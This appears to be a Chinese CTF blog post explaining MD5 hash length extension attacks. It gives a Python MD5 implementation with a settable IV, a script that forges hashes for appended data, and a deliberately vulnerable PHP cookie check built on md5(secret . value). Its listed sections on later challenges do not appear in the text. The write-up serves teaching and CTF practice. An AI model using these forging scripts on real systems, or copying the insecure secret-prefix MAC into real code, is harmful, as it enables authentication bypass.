---
title: Hash length extension attacks 分析
tags: [WEB漏洞]
date: 2017-07-04 01:27
---
0x00 MD5加密原理0x1 字节填充0x2 分组加密0x3 实例演示0x01 攻击原理0x02 攻击脚本0x1 md5 python 实现0x2 计算脚本0x03 实例演示0x1 简单实例0x2 jarvisoj flag在管理员手里方法一 利用hash_extender方法二 利用上述脚本0x3 adminstep 1 初步审计step 2 直接解密解法一ste
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><p><div class="toc"><div class="toc">
<ul>
<li><a href="#0x00-md5加密原理">0x00 MD5加密原理</a><ul>
<li><a href="#0x1-字节填充">0x1 字节填充</a></li>
<li><a href="#0x2-分组加密">0x2 分组加密</a></li>
<li><a href="#0x3-实例演示">0x3 实例演示</a></li>
</ul>
</li>
<li><a href="#0x01-攻击原理">0x01 攻击原理</a></li>
<li><a href="#0x02-攻击脚本">0x02 攻击脚本</a><ul>
<li><a href="#0x1-md5-python-实现">0x1 md5 python 实现</a></li>
<li><a href="#0x2-计算脚本">0x2 计算脚本</a></li>
</ul>
</li>
<li><a href="#0x03-实例演示">0x03 实例演示</a><ul>
<li><a href="#0x1-简单实例">0x1 简单实例</a></li>
<li><a href="#0x2-jarvisoj-flag在管理员手里">0x2 jarvisoj flag在管理员手里</a><ul>
<li><a href="#方法一-利用hashextender">方法一 利用hash_extender</a></li>
<li><a href="#方法二-利用上述脚本">方法二 利用上述脚本</a></li>
</ul>
</li>
<li><a href="#0x3-admin">0x3 admin</a><ul>
<li><a href="#step-1-初步审计">step 1 初步审计</a></li>
<li><a href="#step-2-直接解密解法一">step 2 直接解密解法一</a></li>
<li><a href="#step-3-利用hash拓展攻击没有必要">step 3 利用hash拓展攻击没有必要</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>
</p>
<blockquote>
<p>最近突然想把以前做的哈希拓展长度攻击的原理给梳理一下，前一段时间梳理了 padding  oracle attack的<a href="http://blog.csdn.net/qq_31481187/article/details/71773789">相关知识</a>，打算从原理到题目都详细的讲一讲,使用条件比较苛刻需要攻击者明密文都可控，所以在平时这种漏洞很少见，后面主要介绍一下工具的使用方法以及，jarvis平台上的一道题目，以及2017年陕西省信息安全竞赛的最后一道题目admin</p>
</blockquote>
<p>哈希拓展可以伪造任意一对明密文，前提是有一对明密文，且伪造的明文前512比特是固定的···</p>
<h1 id="0x00-md5加密原理">0x00 MD5加密原理</h1>
<p>一些dalao的博客这一点已经说得很清楚了，例如 <a href="http://blog.csdn.net/qq_35078631/article/details/70941204">Assassin师傅的博文</a></p>
<h2 id="0x1-字节填充">0x1 字节填充</h2>
<p>MD5在进行运算时，需要将bit位数填充到指定位数，使其长度在对 512bit 取模后的值为 448bit，留下的64bit用来填写未填充的明文长度</p>
<h2 id="0x2-分组加密">0x2 分组加密</h2>
<p>把填充过的（注意如果明文大于512bit，将分成多个组进行加密）明文按512bit一组进行下述加密</p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170703210658509?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>我们可以看到初始向量IV为128bit，每组加密过之后当做下一组的向量进行运算。最后输出的128bit就是md5值</p>
<h2 id="0x3-实例演示">0x3 实例演示</h2>
<p>前面MD5的加密逻辑说得很清楚，这里利用一个实例模拟一下加密过程 </p>
<table>
<thead>
<tr>
<th align="left">加密数据</th>
<th align="right">Value</th>
</tr>
</thead>
<tbody><tr>
<td align="left">十六进制</td>
<td align="right">0x61646d696e</td>
</tr>
<tr>
<td align="left">填充之后</td>
<td align="right">0x61646d696e+0x80+50*0x00+0x28+0x00*7</td>
</tr>
</tbody></table>
<p>首先字节填充，比特第一位补位1，其余位为0所以为0x80 <br>
后面全是0字节填充一直到448bit截止，剩下的8byte按照小端方式存储。admin占位5字节所以40bit=0x28bit。 <br>
这就是基本的MD5加密算法的流程，有没有看懂？？如果看懂了有没有发现攻击者的可乘之机？？</br></br></p>
<h1 id="0x01-攻击原理">0x01 攻击原理</h1>
<p>上篇稍微讲了一下，MD5加密的原理，这里主要讲解攻击方法 <br>
假设我们已经知道<code>md5($secret+”admin”+”admin”)</code>的值<code>hash1</code> <br>
其实就是<code>iv  与 $secret+”admin”+”admin”的填充值（这里填充了512bit）的hash值</code> <br>
<strong>现在假设我们有自己的hash算法可以构造任意的初始iv可以填充任意参与计算的明文</strong> <br>
现在有以下结论 <br>
如果我要<code>md5（$secret+”admin”+”admin”+第一组MD5填充+padding）</code>这里的第一组md5分组就是<code>md5（$secret+”admin”+”admin”）时的填充之后的512bit块</code> <br>
那么此值应该在逻辑上等于我利用<code>hash1</code>当做初始向量加密我构造的<code>padding+填充字节（注意这里的填充是算上第一块的长度的即512bit）</code>的第二块生成的md5值</br></br></br></br></br></br></p>
<p>简单的将就是</p>
<pre class="prettyprint"><code class=" hljs bash">md5（<span class="hljs-variable">$secret</span>+”admin”+”admin”+第一组MD5填充+padding）=(<span class="hljs-built_in">hash</span>1)md5(padding+填充字节)</code></pre>
<h1 id="0x02-攻击脚本">0x02 攻击脚本</h1>
<p>这里引用别人写的脚本</p>
<h2 id="0x1-md5-python-实现">0x1 md5 python 实现</h2>
<p>可以自定义iv值</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-comment"># @Author：DshtAnger</span>
<span class="hljs-comment"># theory reference:</span>
<span class="hljs-comment">#   blog：</span>
<span class="hljs-comment">#       http://blog.csdn.net/adidala/article/details/28677393</span>
<span class="hljs-comment">#       http://blog.csdn.net/forgotaboutgirl/article/details/7258109</span>
<span class="hljs-comment">#       http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html</span>
<span class="hljs-comment">#   RFC1321：</span>
<span class="hljs-comment">#       https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf</span>
<span class="hljs-comment">##############################################################################</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genMsgLengthDescriptor</span><span class="hljs-params">(msg_bitsLenth)</span>:</span>
    <span class="hljs-string">'''
    ---args:
            msg_bitsLenth : the bits length of raw message
    --return:
            16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding
    '''</span>
    <span class="hljs-keyword">return</span> __import__(<span class="hljs-string">"struct"</span>).pack(<span class="hljs-string">"&gt;Q"</span>,msg_bitsLenth).encode(<span class="hljs-string">"hex"</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse_hex_8bytes</span><span class="hljs-params">(hex_str)</span>:</span>
    <span class="hljs-string">'''
    --args:
            hex_str: a hex-encoded string with length 16 , i.e.8bytes
    --return:
            transform raw message descriptor to little-endian 
    '''</span>
    hex_str = <span class="hljs-string">"%016x"</span>%int(hex_str,<span class="hljs-number">16</span>)
    <span class="hljs-keyword">assert</span> len(hex_str)==<span class="hljs-number">16</span>    
    <span class="hljs-keyword">return</span> __import__(<span class="hljs-string">"struct"</span>).pack(<span class="hljs-string">"&lt;Q"</span>,int(hex_str,<span class="hljs-number">16</span>)).encode(<span class="hljs-string">"hex"</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse_hex_4bytes</span><span class="hljs-params">(hex_str)</span>:</span>
    <span class="hljs-string">'''
    --args:
            hex_str: a hex-encoded string with length 8 , i.e.4bytes
    --return:
            transform 4 bytes message block to little-endian
    '''</span>    
    hex_str = <span class="hljs-string">"%08x"</span>%int(hex_str,<span class="hljs-number">16</span>)
    <span class="hljs-keyword">assert</span> len(hex_str)==<span class="hljs-number">8</span>    
    <span class="hljs-keyword">return</span> __import__(<span class="hljs-string">"struct"</span>).pack(<span class="hljs-string">"&lt;L"</span>,int(hex_str,<span class="hljs-number">16</span>)).encode(<span class="hljs-string">"hex"</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deal_rawInputMsg</span><span class="hljs-params">(input_msg)</span>:</span>
    <span class="hljs-string">'''
    --args:
            input_msg : inputed a ascii-encoded string
    --return:
            a hex-encoded string which can be inputed to mathematical transformation function.
    '''</span>
    ascii_list = [x.encode(<span class="hljs-string">"hex"</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> input_msg]
    length_msg_bytes = len(ascii_list)
    length_msg_bits = len(ascii_list)*<span class="hljs-number">8</span>
    <span class="hljs-comment">#padding</span>
    ascii_list.append(<span class="hljs-string">'80'</span>)  
    <span class="hljs-keyword">while</span> (len(ascii_list)*<span class="hljs-number">8</span>+<span class="hljs-number">64</span>)%<span class="hljs-number">512</span> != <span class="hljs-number">0</span>:  
        ascii_list.append(<span class="hljs-string">'00'</span>)
    <span class="hljs-comment">#add Descriptor</span>
    ascii_list.append(reverse_hex_8bytes(genMsgLengthDescriptor(length_msg_bits)))
    <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>.join(ascii_list)



<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM16</span><span class="hljs-params">(hex_str,operatingBlockNum)</span>:</span>
    <span class="hljs-string">'''
    --args:
            hex_str : a hex-encoded string with length in integral multiple of 512bits
            operatingBlockNum : message block number which is being operated , greater than 1
    --return:
            M : result of splited 64bytes into 4*16 message blocks with little-endian

    '''</span>
    M = [int(reverse_hex_4bytes(hex_str[i:(i+<span class="hljs-number">8</span>)]),<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">128</span>*(operatingBlockNum-<span class="hljs-number">1</span>),<span class="hljs-number">128</span>*operatingBlockNum,<span class="hljs-number">8</span>)]
    <span class="hljs-keyword">return</span> M

<span class="hljs-comment">#定义函数，用来产生常数T[i]，常数有可能超过32位，同样需要&amp;0xffffffff操作。注意返回的是十进制的数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">T</span><span class="hljs-params">(i)</span>:</span>
    result = (int(<span class="hljs-number">4294967296</span>*abs(__import__(<span class="hljs-string">"math"</span>).sin(i))))&amp;<span class="hljs-number">0xffffffff</span>
    <span class="hljs-keyword">return</span> result   

<span class="hljs-comment">#定义每轮中用到的函数</span>
<span class="hljs-comment">#RL为循环左移，注意左移之后可能会超过32位，所以要和0xffffffff做与运算，确保结果为32位</span>
F = <span class="hljs-keyword">lambda</span> x,y,z:((x&amp;y)|((~x)&amp;z))
G = <span class="hljs-keyword">lambda</span> x,y,z:((x&amp;z)|(y&amp;(~z)))
H = <span class="hljs-keyword">lambda</span> x,y,z:(x^y^z)
I = <span class="hljs-keyword">lambda</span> x,y,z:(y^(x|(~z)))
RL = L = <span class="hljs-keyword">lambda</span> x,n:(((x&lt;&lt;n)|(x&gt;&gt;(<span class="hljs-number">32</span>-n)))&amp;(<span class="hljs-number">0xffffffff</span>))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">FF</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span>  
    a = (a+F ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;  
    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;  
    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span>  
    <span class="hljs-keyword">return</span> a  
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GG</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span>  
    a = (a+G ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;  
    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;  
    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span>  
    <span class="hljs-keyword">return</span> a  
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">HH</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span>  
    a = (a+H ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;  
    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;  
    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span>  
    <span class="hljs-keyword">return</span> a  
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">II</span><span class="hljs-params">(a, b, c, d, x, s, ac)</span>:</span>  
    a = (a+I ((b), (c), (d)) + (x) + (ac)&amp;<span class="hljs-number">0xffffffff</span>)&amp;<span class="hljs-number">0xffffffff</span>;  
    a = RL ((a), (s))&amp;<span class="hljs-number">0xffffffff</span>;  
    a = (a+b)&amp;<span class="hljs-number">0xffffffff</span>  
    <span class="hljs-keyword">return</span> a      

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_md5</span><span class="hljs-params">(A,B,C,D)</span>:</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>.join( [  <span class="hljs-string">""</span>.join(__import__(<span class="hljs-string">"re"</span>).findall(<span class="hljs-string">r".."</span>,<span class="hljs-string">"%08x"</span>%i)[::-<span class="hljs-number">1</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (A,B,C,D)  ]  )

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_md5</span><span class="hljs-params">(A=<span class="hljs-number">0x67452301</span>,B=<span class="hljs-number">0xefcdab89</span>,C=<span class="hljs-number">0x98badcfe</span>,D=<span class="hljs-number">0x10325476</span>,readyMsg=<span class="hljs-string">""</span>)</span>:</span>

    a = A
    b = B
    c = C
    d = D

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,len(readyMsg)/<span class="hljs-number">128</span>):
        M = getM16(readyMsg,i+<span class="hljs-number">1</span>)
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">16</span>):
            <span class="hljs-keyword">exec</span> <span class="hljs-string">"M"</span>+str(i)+<span class="hljs-string">"=M["</span>+str(i)+<span class="hljs-string">"]"</span>
        <span class="hljs-comment">#First round</span>
        a=FF(a,b,c,d,M0,<span class="hljs-number">7</span>,<span class="hljs-number">0xd76aa478L</span>)
        d=FF(d,a,b,c,M1,<span class="hljs-number">12</span>,<span class="hljs-number">0xe8c7b756L</span>)
        c=FF(c,d,a,b,M2,<span class="hljs-number">17</span>,<span class="hljs-number">0x242070dbL</span>)
        b=FF(b,c,d,a,M3,<span class="hljs-number">22</span>,<span class="hljs-number">0xc1bdceeeL</span>)
        a=FF(a,b,c,d,M4,<span class="hljs-number">7</span>,<span class="hljs-number">0xf57c0fafL</span>)
        d=FF(d,a,b,c,M5,<span class="hljs-number">12</span>,<span class="hljs-number">0x4787c62aL</span>)
        c=FF(c,d,a,b,M6,<span class="hljs-number">17</span>,<span class="hljs-number">0xa8304613L</span>)
        b=FF(b,c,d,a,M7,<span class="hljs-number">22</span>,<span class="hljs-number">0xfd469501L</span>)
        a=FF(a,b,c,d,M8,<span class="hljs-number">7</span>,<span class="hljs-number">0x698098d8L</span>)
        d=FF(d,a,b,c,M9,<span class="hljs-number">12</span>,<span class="hljs-number">0x8b44f7afL</span>)
        c=FF(c,d,a,b,M10,<span class="hljs-number">17</span>,<span class="hljs-number">0xffff5bb1L</span>)
        b=FF(b,c,d,a,M11,<span class="hljs-number">22</span>,<span class="hljs-number">0x895cd7beL</span>)
        a=FF(a,b,c,d,M12,<span class="hljs-number">7</span>,<span class="hljs-number">0x6b901122L</span>)
        d=FF(d,a,b,c,M13,<span class="hljs-number">12</span>,<span class="hljs-number">0xfd987193L</span>)
        c=FF(c,d,a,b,M14,<span class="hljs-number">17</span>,<span class="hljs-number">0xa679438eL</span>)
        b=FF(b,c,d,a,M15,<span class="hljs-number">22</span>,<span class="hljs-number">0x49b40821L</span>)
        <span class="hljs-comment">#Second round</span>
        a=GG(a,b,c,d,M1,<span class="hljs-number">5</span>,<span class="hljs-number">0xf61e2562L</span>)
        d=GG(d,a,b,c,M6,<span class="hljs-number">9</span>,<span class="hljs-number">0xc040b340L</span>)
        c=GG(c,d,a,b,M11,<span class="hljs-number">14</span>,<span class="hljs-number">0x265e5a51L</span>)
        b=GG(b,c,d,a,M0,<span class="hljs-number">20</span>,<span class="hljs-number">0xe9b6c7aaL</span>)
        a=GG(a,b,c,d,M5,<span class="hljs-number">5</span>,<span class="hljs-number">0xd62f105dL</span>)
        d=GG(d,a,b,c,M10,<span class="hljs-number">9</span>,<span class="hljs-number">0x02441453L</span>)
        c=GG(c,d,a,b,M15,<span class="hljs-number">14</span>,<span class="hljs-number">0xd8a1e681L</span>)
        b=GG(b,c,d,a,M4,<span class="hljs-number">20</span>,<span class="hljs-number">0xe7d3fbc8L</span>)
        a=GG(a,b,c,d,M9,<span class="hljs-number">5</span>,<span class="hljs-number">0x21e1cde6L</span>)
        d=GG(d,a,b,c,M14,<span class="hljs-number">9</span>,<span class="hljs-number">0xc33707d6L</span>)
        c=GG(c,d,a,b,M3,<span class="hljs-number">14</span>,<span class="hljs-number">0xf4d50d87L</span>)
        b=GG(b,c,d,a,M8,<span class="hljs-number">20</span>,<span class="hljs-number">0x455a14edL</span>)
        a=GG(a,b,c,d,M13,<span class="hljs-number">5</span>,<span class="hljs-number">0xa9e3e905L</span>)
        d=GG(d,a,b,c,M2,<span class="hljs-number">9</span>,<span class="hljs-number">0xfcefa3f8L</span>)
        c=GG(c,d,a,b,M7,<span class="hljs-number">14</span>,<span class="hljs-number">0x676f02d9L</span>)
        b=GG(b,c,d,a,M12,<span class="hljs-number">20</span>,<span class="hljs-number">0x8d2a4c8aL</span>)
        <span class="hljs-comment">#Third round</span>
        a=HH(a,b,c,d,M5,<span class="hljs-number">4</span>,<span class="hljs-number">0xfffa3942L</span>)
        d=HH(d,a,b,c,M8,<span class="hljs-number">11</span>,<span class="hljs-number">0x8771f681L</span>)
        c=HH(c,d,a,b,M11,<span class="hljs-number">16</span>,<span class="hljs-number">0x6d9d6122L</span>)
        b=HH(b,c,d,a,M14,<span class="hljs-number">23</span>,<span class="hljs-number">0xfde5380c</span>)
        a=HH(a,b,c,d,M1,<span class="hljs-number">4</span>,<span class="hljs-number">0xa4beea44L</span>)
        d=HH(d,a,b,c,M4,<span class="hljs-number">11</span>,<span class="hljs-number">0x4bdecfa9L</span>)
        c=HH(c,d,a,b,M7,<span class="hljs-number">16</span>,<span class="hljs-number">0xf6bb4b60L</span>)
        b=HH(b,c,d,a,M10,<span class="hljs-number">23</span>,<span class="hljs-number">0xbebfbc70L</span>)
        a=HH(a,b,c,d,M13,<span class="hljs-number">4</span>,<span class="hljs-number">0x289b7ec6L</span>)
        d=HH(d,a,b,c,M0,<span class="hljs-number">11</span>,<span class="hljs-number">0xeaa127faL</span>)
        c=HH(c,d,a,b,M3,<span class="hljs-number">16</span>,<span class="hljs-number">0xd4ef3085L</span>)
        b=HH(b,c,d,a,M6,<span class="hljs-number">23</span>,<span class="hljs-number">0x04881d05L</span>)
        a=HH(a,b,c,d,M9,<span class="hljs-number">4</span>,<span class="hljs-number">0xd9d4d039L</span>)
        d=HH(d,a,b,c,M12,<span class="hljs-number">11</span>,<span class="hljs-number">0xe6db99e5L</span>)
        c=HH(c,d,a,b,M15,<span class="hljs-number">16</span>,<span class="hljs-number">0x1fa27cf8L</span>)
        b=HH(b,c,d,a,M2,<span class="hljs-number">23</span>,<span class="hljs-number">0xc4ac5665L</span>)
        <span class="hljs-comment">#Fourth round</span>
        a=II(a,b,c,d,M0,<span class="hljs-number">6</span>,<span class="hljs-number">0xf4292244L</span>)
        d=II(d,a,b,c,M7,<span class="hljs-number">10</span>,<span class="hljs-number">0x432aff97L</span>)
        c=II(c,d,a,b,M14,<span class="hljs-number">15</span>,<span class="hljs-number">0xab9423a7L</span>)
        b=II(b,c,d,a,M5,<span class="hljs-number">21</span>,<span class="hljs-number">0xfc93a039L</span>)
        a=II(a,b,c,d,M12,<span class="hljs-number">6</span>,<span class="hljs-number">0x655b59c3L</span>)
        d=II(d,a,b,c,M3,<span class="hljs-number">10</span>,<span class="hljs-number">0x8f0ccc92L</span>)
        c=II(c,d,a,b,M10,<span class="hljs-number">15</span>,<span class="hljs-number">0xffeff47dL</span>)
        b=II(b,c,d,a,M1,<span class="hljs-number">21</span>,<span class="hljs-number">0x85845dd1L</span>)
        a=II(a,b,c,d,M8,<span class="hljs-number">6</span>,<span class="hljs-number">0x6fa87e4fL</span>)
        d=II(d,a,b,c,M15,<span class="hljs-number">10</span>,<span class="hljs-number">0xfe2ce6e0L</span>)
        c=II(c,d,a,b,M6,<span class="hljs-number">15</span>,<span class="hljs-number">0xa3014314L</span>)
        b=II(b,c,d,a,M13,<span class="hljs-number">21</span>,<span class="hljs-number">0x4e0811a1L</span>)
        a=II(a,b,c,d,M4,<span class="hljs-number">6</span>,<span class="hljs-number">0xf7537e82L</span>)
        d=II(d,a,b,c,M11,<span class="hljs-number">10</span>,<span class="hljs-number">0xbd3af235L</span>)
        c=II(c,d,a,b,M2,<span class="hljs-number">15</span>,<span class="hljs-number">0x2ad7d2bbL</span>)
        b=II(b,c,d,a,M9,<span class="hljs-number">21</span>,<span class="hljs-number">0xeb86d391L</span>)


        A += a
        B += b
        C += c
        D += d

        A = A&amp;<span class="hljs-number">0xffffffff</span>
        B = B&amp;<span class="hljs-number">0xffffffff</span>
        C = C&amp;<span class="hljs-number">0xffffffff</span>
        D = D&amp;<span class="hljs-number">0xffffffff</span>

        a = A
        b = B
        c = C
        d = D

    <span class="hljs-keyword">return</span> show_md5(a,b,c,d)</code></pre>
<h2 id="0x2-计算脚本">0x2 计算脚本</h2>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-comment"># @Author：DshtAnger</span>
<span class="hljs-keyword">import</span> my_md5
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes, bytes_to_long
<span class="hljs-comment">#reference:</span>
<span class="hljs-comment">#   http://www.freebuf.com/articles/web/69264.html</span>
<span class="hljs-comment">#problem link:</span>
<span class="hljs-comment">#   http://ctf4.shiyanbar.com/web/kzhan.php</span>
samplehash=<span class="hljs-string">"ec82a52bac65135157dfa73daa3548b1"</span>

<span class="hljs-string">'''
res = re.findall('.{8}',samplehash)
print res 

s = '03194d72'
print c
s1 = ""
print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])
'''</span>
s =[]
res = re.findall(<span class="hljs-string">'.{8}'</span>,samplehash)
<span class="hljs-keyword">print</span> res 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:
    ss = <span class="hljs-string">""</span>

    ss = ss.join([i[j-<span class="hljs-number">2</span>]+i[j-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(len(i),<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>)])

    s.append(bytes_to_long(binascii.a2b_hex(ss)))
<span class="hljs-keyword">print</span> [hex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]
<span class="hljs-comment"># 084e0343 a0486ff0 5530df6c 705c8bb4</span>
<span class="hljs-comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span>

s1=s[<span class="hljs-number">0</span>]
s2=s[<span class="hljs-number">1</span>]
s3=s[<span class="hljs-number">2</span>]
s4=s[<span class="hljs-number">3</span>]
<span class="hljs-comment">#exp</span>
secret = <span class="hljs-string">"a"</span>*<span class="hljs-number">15</span>
secret_admin=<span class="hljs-string">"xxxxxguest"</span>+<span class="hljs-string">'\x80'</span>+<span class="hljs-string">'\x00'</span>*<span class="hljs-number">45</span>+<span class="hljs-string">'\x50'</span>+<span class="hljs-string">'\x00'</span>*<span class="hljs-number">7</span>+<span class="hljs-string">"admin"</span>
r = my_md5.deal_rawInputMsg(secret_admin)
inp = r[len(r)/<span class="hljs-number">2</span>:]      <span class="hljs-comment">#我们需要截断的地方，也是我们需要控制的地方</span>
<span class="hljs-comment">#print r</span>
<span class="hljs-comment">#print inp</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">"getmein:"</span>+my_md5.run_md5(s1,s2,s3,s4,inp)
<span class="hljs-keyword">print</span> <span class="hljs-string">"getmein:"</span>+hashlib.md5(secret_admin).hexdigest()</code></pre>
<h1 id="0x03-实例演示">0x03 实例演示</h1>
<h2 id="0x1-简单实例">0x1 简单实例</h2>
<pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span> 
<span class="hljs-variable">$SECRET</span>=<span class="hljs-string">"xxxxx"</span>;
<span class="hljs-variable">$auth</span> = <span class="hljs-string">"guest"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"auth"</span>])) {
    <span class="hljs-variable">$hsh</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"hsh"</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$hsh</span> === md5(<span class="hljs-variable">$SECRET</span> . <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"auth"</span>])) {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"flag{I_L0vE_L0li}"</span>);
    }
} <span class="hljs-keyword">else</span> {
    setcookie(<span class="hljs-string">"auth"</span>, <span class="hljs-variable">$auth</span>);
    setcookie(<span class="hljs-string">"hsh"</span>, md5(<span class="hljs-variable">$SECRET</span>.<span class="hljs-variable">$auth</span>));
}
<span class="hljs-preprocessor">?&gt;</span></span></code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170704005525497?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-comment"># @Author：DshtAnger</span>
<span class="hljs-keyword">import</span> my_md5
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes, bytes_to_long
<span class="hljs-comment">#reference:</span>
<span class="hljs-comment">#   http://www.freebuf.com/articles/web/69264.html</span>
<span class="hljs-comment">#problem link:</span>
<span class="hljs-comment">#   http://ctf4.shiyanbar.com/web/kzhan.php</span>
samplehash=<span class="hljs-string">"06be518adbb45a90440c98bb364d4cf8"</span>

<span class="hljs-string">'''
res = re.findall('.{8}',samplehash)
print res 

s = '03194d72'
print c
s1 = ""
print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])
'''</span>
s =[]
res = re.findall(<span class="hljs-string">'.{8}'</span>,samplehash)
<span class="hljs-keyword">print</span> res 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:
    ss = <span class="hljs-string">""</span>

    ss = ss.join([i[j-<span class="hljs-number">2</span>]+i[j-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(len(i),<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>)])

    s.append(bytes_to_long(binascii.a2b_hex(ss)))
<span class="hljs-keyword">print</span> [hex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]
<span class="hljs-comment"># 084e0343 a0486ff0 5530df6c 705c8bb4</span>
<span class="hljs-comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span>

s1=s[<span class="hljs-number">0</span>]
s2=s[<span class="hljs-number">1</span>]
s3=s[<span class="hljs-number">2</span>]
s4=s[<span class="hljs-number">3</span>]
<span class="hljs-comment">#exp</span>
secret = <span class="hljs-string">"a"</span>*<span class="hljs-number">15</span>
secret_admin=<span class="hljs-string">"yyyyyyyyzzzzzzzadminadmin"</span>+<span class="hljs-string">'\x80'</span>+<span class="hljs-string">'\x00'</span>*<span class="hljs-number">30</span>+<span class="hljs-string">'\xc8'</span>+<span class="hljs-string">'\x00'</span>*<span class="hljs-number">7</span>+<span class="hljs-string">"admin"</span>
r = my_md5.deal_rawInputMsg(secret_admin)
inp = r[len(r)/<span class="hljs-number">2</span>:]      <span class="hljs-comment">#我们需要截断的地方，也是我们需要控制的地方</span>
<span class="hljs-comment">#print r</span>
<span class="hljs-comment">#print inp</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">"getmein:"</span>+my_md5.run_md5(s1,s2,s3,s4,inp)
<span class="hljs-keyword">print</span> <span class="hljs-string">"getmein:"</span>+hashlib.md5(secret_admin).hexdigest()</code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170704011612940?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
自己写个访问脚本就可以获取flag</br></img></p>
